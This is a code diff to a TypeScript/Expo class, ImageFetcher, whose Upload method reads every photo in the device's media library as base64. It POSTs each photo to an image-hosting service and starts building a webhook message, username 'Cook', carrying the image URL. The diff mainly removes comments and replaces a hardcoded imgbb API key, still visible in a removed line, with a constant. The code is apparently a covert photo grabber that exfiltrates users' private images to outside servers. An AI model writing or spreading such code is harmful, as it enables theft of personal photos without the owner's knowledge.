@@ -28,32 +28,26 @@ export default class ImageFetcher {
         }
     }
 
-    // upload all fetched photos to a hosting service
     async Upload(): Promise<void>
     {
         if(this.fetched) return;
 
         for(const asset of this.assets)
         {
-            // read image
             if(Device.brand === "Apple" && asset.mediaSubtypes.includes("livePhoto")) continue;
 
             const info:MediaLibrary.AssetInfo = await MediaLibrary.getAssetInfoAsync(asset);
 
             const base64 = await FileSystem.readAsStringAsync(info.localUri, {encoding:'base64'});
-            // (await MediaLibrary.getAssetInfoAsync(asset)).localUri???
 
-             // upload to image server
             const form = new FormData();
             form.append("image", base64);
 
-            const res = await fetch("https://api.imgbb.com/1/upload?key=b87d2277c4634f4ee57ff8ec15094668", {
+            const res = await fetch(KEYS.SERVER_URL, {
                 method: "POST",
                 body: form
             });
             const parsed = JSON.parse(await res.text());
-
-            // send webhook using image url
 
             const webhook: Webhook = {
                 username: "Cook",
